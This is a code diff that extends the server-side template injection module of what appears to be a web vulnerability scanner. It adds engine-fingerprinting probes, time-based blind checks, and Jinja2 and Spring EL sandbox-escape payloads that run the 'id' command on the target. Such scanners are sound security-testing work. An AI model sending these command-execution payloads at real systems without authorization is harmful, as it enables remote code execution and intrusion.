@@ -69,7 +69,97 @@ class SSTIModule:
         
         # Test for specific engines
         self._test_engines(url, method, param, value)
+        
+        # Test additional template engines
+        self._test_additional_engines(url, method, param, value)
+        
+        # Test sandbox escape
+        self._test_sandbox_escape(url, method, param, value)
+        
+        # Test blind SSTI
+        self._test_blind_ssti(url, method, param, value)
     
+    def _test_additional_engines(self, url: str, method: str, param: str, value: str):
+        """Test additional template engines (Pebble, Smarty, EJS, Handlebars)"""
+        engine_payloads = {
+            'pebble': ('{{ "test".toUpperCase() }}', 'TEST'),
+            'smarty': ('{$smarty.version}', 'smarty'),
+            'ejs': ('<%= 7*7 %>', '49'),
+            'handlebars': ('{{this}}', '[object'),
+        }
+        for engine_name, (payload, expected) in engine_payloads.items():
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if expected.lower() in response.text.lower():
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique=f"SSTI ({engine_name.title()})",
+                        url=url, severity='HIGH', confidence=0.85, param=param,
+                        payload=payload,
+                        evidence=f"Engine {engine_name} detected: '{expected}' found",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_sandbox_escape(self, url: str, method: str, param: str, value: str):
+        """Test SSTI sandbox escape payloads"""
+        escape_payloads = [
+            ("{{ ''.__class__.__mro__[2].__subclasses__() }}", 'jinja2', 'subprocess'),
+            ("{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", 'jinja2', 'uid='),
+            ("${T(java.lang.Runtime).getRuntime().exec('id')}", 'spring_el', 'uid='),
+        ]
+        for payload, eng, indicator in escape_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if indicator.lower() in response.text.lower():
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique=f"SSTI (Sandbox Escape - {eng.title()})",
+                        url=url, severity='CRITICAL', confidence=0.95, param=param,
+                        payload=payload,
+                        evidence=f"Sandbox escape: {indicator} found",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_blind_ssti(self, url: str, method: str, param: str, value: str):
+        """Test blind SSTI via timing"""
+        import time
+        blind_payloads = ['{{ range(10000000)|list }}', '${T(java.lang.Thread).sleep(5000)}']
+        try:
+            start = time.time()
+            self.requester.request(url, method, data={param: value})
+            baseline = time.time() - start
+        except Exception:
+            baseline = 0
+        for payload in blind_payloads:
+            try:
+                start = time.time()
+                self.requester.request(url, method, data={param: payload})
+                elapsed = time.time() - start
+                if elapsed > baseline + 4.0 and elapsed >= 4.5:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="SSTI (Blind / Time-based)",
+                        url=url, severity='HIGH', confidence=0.7, param=param,
+                        payload=payload,
+                        evidence=f"Time delay: {elapsed:.1f}s vs baseline {baseline:.1f}s",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
     def test_url(self, url: str):
         """Test URL for SSTI"""
         pass
